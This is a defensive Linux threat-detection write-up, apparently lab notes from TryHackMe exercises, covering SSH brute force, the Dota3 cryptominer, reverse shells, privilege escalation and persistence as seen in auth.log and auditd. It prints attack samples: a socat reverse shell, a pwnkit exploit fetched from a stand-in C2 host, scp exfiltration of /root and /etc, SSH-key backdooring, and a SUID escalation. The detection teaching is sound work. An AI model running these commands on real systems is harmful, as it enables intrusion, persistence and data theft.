Linux isn't the unhackable as most people might think. Threats and malware can exist on every system, but of course, there are ways to reduce the attack surface so you can reduce the chances of being compromised.

# SSH
Just like RDP on Windows, SSH is the most common method for initial access when it comes to Linux systems. As Linux is used for most servers and IoT devices, it can also be intruded. 

## How does it happen?
An exposed SSH is the beginning, leaving it open without authentication or having weak credentials that can be brute forced easily. 

**SSH Brute Force**

``` bash
May 10 02:14:11 kali-ssh sshd[1842]: Failed password for invalid user admin from 203.0.113.45 port 49822 ssh2  
May 10 02:14:13 kali-ssh sshd[1844]: Failed password for invalid user test from 203.0.113.45 port 49824 ssh2  
May 10 02:14:15 kali-ssh sshd[1846]: Failed password for root from 203.0.113.45 port 49826 ssh2  
May 10 02:14:17 kali-ssh sshd[1848]: Failed password for root from 203.0.113.45 port 49828 ssh2  
May 10 02:14:19 kali-ssh sshd[1850]: Failed password for root from 203.0.113.45 port 49830 ssh2  
May 10 02:14:21 kali-ssh sshd[1852]: Failed password for root from 203.0.113.45 port 49832 ssh2  
May 10 02:14:23 kali-ssh sshd[1854]: Failed password for root from 203.0.113.45 port 49834 ssh2  
May 10 02:14:25 kali-ssh sshd[1856]: Failed password for root from 203.0.113.45 port 49836 ssh2  
May 10 02:14:27 kali-ssh sshd[1858]: Accepted password for root from 203.0.113.45 port 49838 ssh2  
May 10 02:14:27 kali-ssh sshd[1858]: pam_unix(sshd:session): session opened for user root(uid=0) by (uid=0)
```

As we can see the common brute force sign of multiple failed logins at the same time with few seconds in difference, it could be manual or automated. The user eventually gains access to **root** and a session is opened.

# Detection Methods
It is pretty simple to investigate for such type of behavior. We will strictly use the terminal as it is more straightforward without needing to know too much. If you are new to Linux logs take a look [here](https://github.com/12oLL/Labz/blob/main/LogAnalysis/Linux/Logging%20in%20Terminal.md) so you are prepared better.

![](images/accept.png)

Filtering for **Accepted** will give us the logins that approved and whether they were SSH keys or passwords. Talking about this seems easy, but what do we look for exactly that indicates a red flag?

- **Username**: Who is this person?
- **IP Address**: Is it internal or external?
- **Login Method:** When and how did this person get in? 

For IP addresses specifically, it can be of great assistance in knowing if someone logged in from within the network or not. Below is a guide:

- `10.0.0.0 – 10.255.255.255` (`10.0.0.0/8`)
- `172.16.0.0 – 172.31.255.255` (`172.16.0.0/12`)
- `192.168.0.0 – 192.168.255.255` (`192.168.0.0/16`)
- `127.0.0.0/8` = localhost
- `169.254.0.0/16` = link-local/APIPA

Now the next step is, should you continue to investigate this log or not? To know so, you connect the dots as i mentioned before. Combining the **time of the login**, **IP address**, and **actions done by user after login** will help you handle the situation better.

# Discovery
Most of the time attackers gain access and end up in a terminal via SSH for example. If you are in that position, what is the first thing you would do? Most likely you would use commands like *pwd* for instance to know where you are at and get to know where to go. 

This is the first step in discovery, to think like an attacker. Lets go through some common commands that should alert you. 

**OS and file system**: pwd, ls /, env, uname -a, lsb_release -a, hostname

**User and Groups**: id, whoami, w, last, cat /etc/sudoers, cat /etc/passwd

**Process & Network**: ps aux, top, ip a, ip r, arp -a, ss -tnlp, netstat tnlp

As you might have noticed, the commands mentioned are very common, so how would you know if it was used legitimately or by an unauthorized user? Thats our next step.

# Detecting Discovery
Motives of attackers vary, it can be credential harvesting, cryptomining, and other intentions. 

Detecting discovery can be done by several methods. First we configure **auditd** as we mentioned before [here](https://github.com/12oLL/Labz/blob/main/LogAnalysis/Linux/Logging%20in%20Terminal.md). We configure the rules to our liking by adding commands that alerts us when executed such as whoami, id, netstat and whatever else. 

Configuration of rules up to your needs.

![](images/auditd.png)

After applying the rules, an alert will come out like this with the key equal to whatever you named it during the rules configuration. You can also filter using the keyword to search for specific triggered alerts like **discovery_user**.

![](images/ppid.png)

As with everything else, context remains the most important key. The commands can be used by anybody, which is why you go further with the analysis to see who it was and what they did. You can do so by filtering logs using the **pid or ppid** to see what started and the processes following the parent process.

For instance over here, I filtered for the command of **id**, and below i can see the users that executed the command as well as go further with the analysis using the process id. 

![](images/idcom.png)

Analyzing using PID

![](images/pid.png)

Processes of PPID

![](images/ppidrez.png)

When you find a process that interests you, such as a .sh shell, you can check the **cwd** option. Below is an example.

![](images/cwd.png)

![](images/sh.png)

As we can see, we found a script that was found to be executed when analyzed using auditd.

# Dota3 Malware
Dota3 is a malware that is actively infecting systems. Read more about it [here](https://www.countercraftsec.com/blog/dota3-malware-again-and-again/).
Basically, Dota3 malware is a Linux based botnet and cryptominer that primarily targets servers that has weak SSH credentials.

## Initial Access
The initial access happens in the following steps: 
- The botnet has thousands of IPs that scan for systems with open SSH
- Brute-force attempts against the systems trying to get root user
- If the attempt is successful, access is gained through SSH

## Discovery
After the botnet gains access through SSH, there is an automated script of commands to check the system's hardware, which is the biggest sign of a cryptominer malware. 


```bash
# These commands check the cpu and ram info 
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
lscpu | grep Model
# Unclear purpose
ls -lh $(which ls)
# Generic Discovery
crontab -l 
w
uname -m
```

## Persistence
To achieve persistence on the system, the threat actor changes the password and replace SSH keys of the system with their own. When all this is done, the attacker has access to the system whenever they want.

```bash
`echo -e "ubuntu123\nN2a96PU0mBfS\nN2a96PU0mBfS"|passwd|bash` >> up.txt
cd ~
rm -rf .ssh
mkdir .ssh
# Note: "mdrfckr" comment is unique to this attack
echo "ssh-rsa [ssh-key] mdrfckr" >> .ssh/authorized_keys
chmod -R go= ~/.ssh
```

To monitor for such attack manually, you can go through the **auth.log** logs and filter for any accepted SSH logins. You can also search through **auditd** and filter for suspicious commands.

# Lab
Let's do a lab  to find Dota3 malware and detect the malware attack in its early stage and see how it works once its on the device. For this lab, we are going through logs using the terminal only with no GUI.

**Q1**: Which IP address managed to brute-force the exposed SSH?
We have a scenario folder that has **auth.log** and **audit.log**. 
Filtering for the word Accepted is our key to find successful login attempts. We can also use Failed to get the failed attempts and see if there is brute-force attempts.

![](images/accept.png)

Failed login attempts

![](images/failed.png) 

**Q2**: Which command did the attacker user to list the last logged-in users?
For this question we will go ahead and filter for the command **last** inside the **audit.log**, so the answer is last anyway.

![](images/last.png)

**Q3**: Which three EDR processes did the attacker look for with "egrep"?
This question is straightforward, we need to find EDR processes that the attacker was looking for. We will do this filtering for the command **egrep**.

![](images/falcon.png)

# Cryptominer Setup
Okay, so now we know what is Dota3, how it works, and how to detect it. Now let's take a look on how it is setup.

After Dota3 has SSH access to a system, it has to decide if it is going to install malware or a cryptominer. Lets go through the steps:

- It starts by transferring a .gz file using SCP

``` bash
hacker@bot69$ scp dota3.tar.gz ubuntu@victim:/tmp [OK] Transfered dota3.tar.gz file to the victim
```

- After the transfer, the attacker hides the files and unzip them under **/tmp**. 

```bash
# Prepare a hidden /tmp/.X26-unix folder for malware
cd /tmp
rm -rf .X2*
mkdir .X26-unix
cd .X26-unix
# Unarchive malware to /tmp/.X26-unix/.rsync/c folder
tar xf dota3.tar.gz
sleep 3s
cd /tmp/.X26-unix/.rsync/c
```

- Lastly, the attacker execute two binaries from archive. The first **tsm** is a network scanner that scans for exposed SSH systems on the network. The second **initiall** is an SMRig cryptominer that loads the CPU. The binary **nohup** allows the cryptominer to run in the background even after the attacker is no longer connected via ssh.

```bash
# Scan the internal network with the "tsm" malware
nohup /tmp/.X26-unix/.rsync/c/tsm -p 22 [...] /tmp/up.txt 192.168 >> /dev/null 2>1&
sleep 8m
nohup /tmp/.X26-unix/.rsync/c/tsm -p 22 [...] /tmp/up.txt 172.16 >> /dev/null 2>1&
sleep 20m
# Run the actual cryptominer named "initall"
cd ..; nohup /tmp/.X26-unix/.rsync/initall 2>1&
# That's it, Dota3 attack is now completed!
exit 0
```

## Detection
We went through logs and how to go over them. Auth logs, audit logs, network traffic analysis, and filtering for what we need. 

**Q1**: What is name of the malicious archive that was transferred via SCP?
As we saw previously, the malware transfers files via SCP. So lets find it.

We know that Dota3, as most malware, hides in the **/tmp** file. So we will use that to our advantage when filtering.

![](images/gz.png)

**Q2**: What was the full command line of the cryptominer launch?
This is also found using the same command in the question above.

![](images/nohup.png)

**Q3**: Which IP address range did the attacker scan for an exposed SSH?  
Answer Example: 10.0.0.1-10.0.0.126.

For this question, we will go through the **audit.log** using **ausearch.** 

![](images/sign.png)

After going through the logs a bit, we can see some IP addresses. I noticed a **zvw1** line in the commands, so i filtered for it.

![](images/lazt.png)

# Reverse Shells
Lets move on to the deeper level. When attackers gain initial access to a system by an exploit or a web vulnerability, they dont always have full access. They can face issues such as rate limits and timeouts, making it difficult to proceed with the attack. This is where **reverse shells** come into play.

## What is Reverse Shells?

First, lets talk about Shells. Shell is a program that allows you to interact with a program using commands. It sits as a bridge between you and the computer's kernel. Examples of shells are Bash, Zsh, and PowerShell for Windows.

For Linux, a shell is basically **SSH**, where you can connect to a device using ssh

![SSH connection](images/ssh.png)

![A demonstration of Shell's connection to the kernel.](images/Shell.png)

Now Reverse Shells are different, as it makes the target system connect to the remote user, which gives the user (you) remote access via the command-line. 

# Detecting Reverse Shells 
Lets proceed with our **objective**, which is to be able to detect reverse shell in logs.
As a SOC analyst, reverse shells are treated as critical alerts as they indicate the system being already breached and that the attacker is trying to establish a connection.

### IoCs

Suspicious commands to look for: 

``` bash

root@GOAT:~$ ausearch -i -x socat
# Look for suspicious commands like socat
type=PROCTITLE msg=audit(09/19/25 17:42:10.903:406) : proctitle=socat TCP:10.20.20.20:2525 EXEC:'bash',[...] type=SYSCALL msg=audit(09/19/25 17:42:10.903:406) : ppid=27806 pid=27808 auid=unset uid=serviceuser key=exec 

root@GOAT:~$ ausearch -i --pid 27806
# Find its parent process and build a process tree
type=PROCTITLE msg=audit(09/19/25 17:42:07.825:404) : proctitle=/bin/sh -c 4 -W 1 127.0.0.1 && socat TCP:10.20.20.20:2525 EXEC:'bash',[...] type=SYSCALL msg=audit(09/19/25 17:42:07.825:404) : ppid=27796 pid=27806 auid=unset uid=serviceuser key=exec

root@GOAT:~$ ausearch -i --pid 27796
# Move up the process tree to confirm its origin - TryPingMe
type=PROCTITLE msg=audit(09/19/25 17:41:57.252:403) : proctitle=/usr/bin/python3 /opt/trypingme/main.py type=SYSCALL msg=audit(09/19/25 17:41:57.252:403) : exe=/usr/bin/python3.12 ppid=1 pid=27796 auid=unset uid=serviceuser key=exec
```

**1st log**: The socat command (SOcket) is a powerful command, it is used to create bidirectional connections between two endpoints. We are using **ausearch** and -x to search for any executions of the socat command. 

**2nd log**: After finding the parent id (pid), we proceed with searching for the process tree.

**3rd log**: We continue going through the process tree to confirm the origin of the executed command which is in this case TryPingMe, as this exercise is from TryHackMe.

After finding the reverse shell and going through its process tree, we go through to find what happened in the Discovery phase, where we look for commands the attacker executed after their initial access.

``` bash

root@GOAT:~$ ausearch -i -x socat # Start from the detected reverse shell type=PROCTITLE msg=audit(09/19/25 17:42:10.903:406) : proctitle=socat TCP:10.20.20.20:2525 EXEC:'bash',[...] type=SYSCALL msg=audit(09/19/25 17:42:10.903:406) : ppid=27806 pid=27808 auid=unset uid=serviceuser key=exec

root@GOAT:~$ ausearch -i --ppid 27808 | grep proctitle # List all its child processes type=PROCTITLE msg=audit(09/19/25 17:42:12.825:408) : proctitle=id type=PROCTITLE msg=audit(09/19/25 17:42:14.371:410) : proctitle=uname -a type=PROCTITLE msg=audit(09/19/25 17:42:25.432:412) : proctitle=ls -la . [...]
```

We specifically focus on the process title **(proctitle)**, as it shows us the commands the attacker executed or **argc**, to see the arguments (commands) one by one.

# Privilege Escalation

Most of the time attackers dont actually gain root access straight away, they rather start with a low-privileged account. These accounts are sometimes restricted to a single folder or environment like (/var/www/html) and dont have full access to everything around, making them unable to download and run malware.

This is where **Privilege Escalation** comes in. Privilege Escalation can be done using multiple methods and techniques.

- **uname -a** can be used to see the version of the system and perhaps exploit it if it is outdated and already has a public exploit for it.

-  **find /bin -perm 4000** detects env binary with SUID flag. This can be used to get root access using the SUID vulnerability **/bin/env /bin/bash -p**.

- **ls /etc/ssh** to check for exposed and unprotected **ssh-backup-key** file. The backup key can be used to gain root access without knowing the password.
  e.g: **ssh root@127.0.0.1 -i ssh-backup-key**.

## Detecting Privilege Escalation

Detecting PE depends on misconfiguration of SUID. There are a huge amount of SUID misconfigurations and software vulnerabilities. In this case we will try to detect the surrounding events in 3 steps: **Discovery**, **Privilege Escalation**, and **Exfiltration** after root access is gained.

Lets go through some commands to check for each step and know if anything suspicious was executed.

**Discovery**

**First detection method**: A spike of discovery commands.

``` bash
whoami # Return "www-data" user

id; pwd; ls -la; crontab -l # Basic initial Discovery

ps aux | egrep "edr|splunk|elastic" # Security tools for Discovery

uname -r. # Returns an old 4.4 kernel
```

**Second detection method**: A download to Temp directory.

```bash
wget http://c2-server.thm/pwnkit.c -O /tmp/pwnkit.c   # Pwnkit exploit download

gcc /tmp/pwnkit.c -o /tmp/pwnkit                      # Pwnkit exploit compilation

chmod +x /tmp/pwnkit                                  # Making exploit executable

/tmp/pwnkit                                           # Trying to use the exploit
```

**Third detection methods**: Data Exfiltration with SCP

``` bash
whoami                                                # Now returns "root" user

tar czf dump.tar.gz /root /etc/                       # Archiving sensitive data

scp dump.tar.gz attacker@c2-server.thm:~              # Exfiltrating the data
```

# PE Lab

Lets try to detect a privilege escalation through some logs.

**Q1**: Which command line was used to look for the "pass" keyword in files?

I used grep and filtered for pass, simple as that.

![](images/greppass.png)

**Q2**: Which command line was used to escalate privileges to root?

Same thing here, i grepped for root and found it straight away.

![](images/root.png)

**Q3**: Looking at the detected .env file, what was the root password?

This question is a little tricky, and im not sure if my way is correct lol. I went through the **/opt/trypingme** directory, as it was accessed by the attacker after gaining initial access and we can see a discovery command **whoami**.

![](images/opt.png)

So after going there, i changed directories to the /opt directory and found **TWO** files that was clear. 

![](images/opzies.png)

So I wrote cat then clicked TAB to auto complete and it showed me **.env.local** which was hidden whenever i listed it, and found the answer.

![](images/pass.png)

Another way to answer this is to run this command in the TryPingMe reverse shell machine attached and get the exact answer.  

![](images/envTPM.png)

![](images/TPMpass.png)

And that was it for privilege escalation !

# Establishing Startup Persistence

Linux servers can run for years without a reboot and are often unaltered and untouched unless a necessary update was needed or if something breaks. This is what attackers rely on to have access but this isnt ALWAYS the case. For a long-term persistence attackers have to install a backdoor, to remain in the system whether it was rebooted or not.

## Cron Persistence

Cron jobs are basically scheduled tasks from Windows, it is the simplest way to run a process on schedule and the most popular method. For instance [APT29](https://attack.mitre.org/groups/G0016/) has a C2 backdoor for both Windows and Linux for their malware [GoldMax](https://attack.mitre.org/software/S0588/).  They ensured it survives reboots by adding a new line to the victim's cron job file located at **/var/spool/cron/USER**. 

``` bash
@reboot nohup /home/<user>/.<hidden-directory>/<malware-name> > /dev/null 2>&1 &
```

Lets move on without wasting too much time, we will focus on the GoldMax malware and how to detect persistence.

Our goal is to detect persistence as soon as it established, and we can do so using multiple techniques. 

 **Monitoring changes in cron job files**: `/etc/crontab `, `/etc/cron.d*`, `/var/spool/cron/*`, `/var/spool/crontab/*`

**Monitoring changes in systemd folders**: `/lib/systemd/system/*` and `/etc/systemd/system/*`

**Monitor related processes**: `nano /etc/crontab`, `crontab -e`, `systemctl start|enable <service>`

## Test

Lets go through some practice after what we just digested. 
First, i will go through the rules of the auditd on the system provided by the TryHackMe lab

![](images/auditdrulez.png)

We can see it shows the rules that should be logged when we search for them using **ausearch**. We talked about auditd rules before if you dont have a clear idea about it in the [Linux System Logs](Linux%20System%20Logs.md). 

Moving on, we will solve two questions. Our task is to detect **2** persistence methods using **auditd logs**.

**Q1**: What flag did you get after running the malware persisting as a service?

We will start by searching using **ausearch**. The reason we are searching there is because **systemd** host the most critical system components. Services files are located in **/lib/systemd/system** or **/etc/systemd/system**.

Because there are many folders inside systemd, we cant go through them manually as that will take too much time and affect our MTTD, so we will use audit search based on the rules defined above.

![](images/systemdAUDIT.png)

The attacker downloaded the persistence and saved it in the **/etc/systemd/system** folder. We will follow the attacker's steps and see what they left behind.

![](images/tuxservice.png)

Lets go and run the service they downloaded.

![](images/badrservice.png)

We can see how the attacker prepared the file and set it to persist despite any reboots. Lets go ahead and run it to get our flag which is in **var/lib/misc**.

![](images/tuxFLAG.png)

And this is our answer.

**Q2**: What flag did you get after running the malware persisting as a cron job?

This question requires us to detect a cron job malware persistence. Lets go ahead and do that.

![](images/CronJOB.png)

We will execute the attackers command **crontab -e** inside the **/var/spool/cron**.

![](images/CronSHOW.png)

I will use nano as it is the simplest.

![](images/cronNANO.png)

**Note:** When going through system directories, you might face issues accessing some files and directories. Make sure to be root using **sudo su**.

Lets search for the directory we just found at the bottom in the picture above.

![](images/cronROOT.png)

And we found our second answer.

# Account Persistence 

What we did in the previous chapter was basically detecting the persistence surviving a reboot, but what about **persistent access**? Lets go through it.

## New User Creation

Having persistent access depends on how the attacker entered and what they did after that.
For instance, if the attacker gained access through SSH, they can create a new user account and add it to a privileged group, then they can access it whenever they want.

To detect such method, you can easily search for account creation in the **auth.log** and filter for useradd and usermod as we did before here [Linux System Logs](Linux%20System%20Logs.md).

``` bash
root@thm-vm:~$ cat /var/log/auth.log | grep -E 'useradd|usermod'
2025-09-18T15:46:30 thm-vm useradd[27254]: new group: name=support, GID=1001 

2025-09-18T15:46:30 thm-vm useradd[27254]: new user: name=support, UID=1001, 
GID=1001, home=/home/support, shell=/bin/bash

2025-09-18T15:46:32 thm-vm usermod[27258]: add 'support' to group 'sudo'

2025-09-18T15:46:32 thm-vm usermod[27258]: add 'support' to shadow group 'sudo'
```

## Backdoored SSH keys

Another common method is also backdooring using SSH created by the attacker. This makes it harder to analyze and find the suspicious SSH key.

``` bash
# Creating an SSH key
root@thm-vm:~$ echo "AAAAC3Nza...IkiINvQt/R" >> ~/.ssh/authorized_keys

# Searching for the SSH key
root@thm-vm:~$ cat ~/.ssh/authorized_keys 
sh-ed25519 AAAAC3Nza...oh5fpNy1Gi # Legitimate key
ssh-ed25519 AAAAC3Nza...N9a2UYsFpQ # Legitimate key 
ssh-ed25519 AAAAC3Nza...IkiINvQt/R # Backdoor key
```

### Detecting SSH Backdoor

By default, authorized SSH public keys are stored in in each user's **/.ssh/authorized_keys** file, so we monitor these files using **auditd**. Note that this isnt the blueprint method to search for SSH backdoors, as there are other ways it can be done and auditd simply cant detect it.

``` bash
root@thm-vm:~$ ausearch -i -f /.ssh/authorized_keys
# Take note that the command 'echo' is logged as 'bash'
type=PROCTITLE msg=audit(09/22/25 16:55:12.740:806) : proctitle=bash

type=PATH msg=audit(09/22/25 16:55:12.740:806) : item=1 

name=/home/user/.ssh/authorized_keys

type=CWD msg=audit(09/22/25 16:55:12.740:806) : cwd=/

type=SYSCALL msg=audit(09/22/25 16:55:12.740:806) : syscall=openat [...] a2=O_WRONLY|O_CREAT|O_EXCL ppid=1265 pid=1310 uid=root exe=/usr/bin/vi key=systemd
```

Lets do some questions.

**Q1**: Which user was created and added to the sudo group?

We will go through the auth log as thats where will account creations will be and we will find our answer. 

![](images/userADD.png)

**Q2**: Which file was changed to allow SSH key persistence?

Use ausearch and search for the default file where public ssh keys are stored and thats our answer. 

![](images/SSHbackdoor.png)

# Conclusion
## Targeted attacks

Lastly, the malwares we have gone through are usually automated and most of the time do not necessarily perform privilege escalation. However, they can be more complex and do that sometimes.

## Linux

Linux machines are used as entry points as they are mostly used as firewalls, web servers, and other public facing services. Although most organizations use Windows, a single compromised Linux server can open a great attack surface to an organization's network such as an active directory and cause a chaos. This is why its good practice as a SOC analyst to be able to secure multiple operating systems to avoid such issue.

## Threat Detection Finale

If you have reached this far, this is what we have covered together so far (highlighted in yellow).
I suggest you take a look at MITRE ATT&CK [Framework]() to have a better understanding and build up your knowledge.

![](images/MITRE.png)

That was all, see yall next time and happy hacking 😃 💻 .
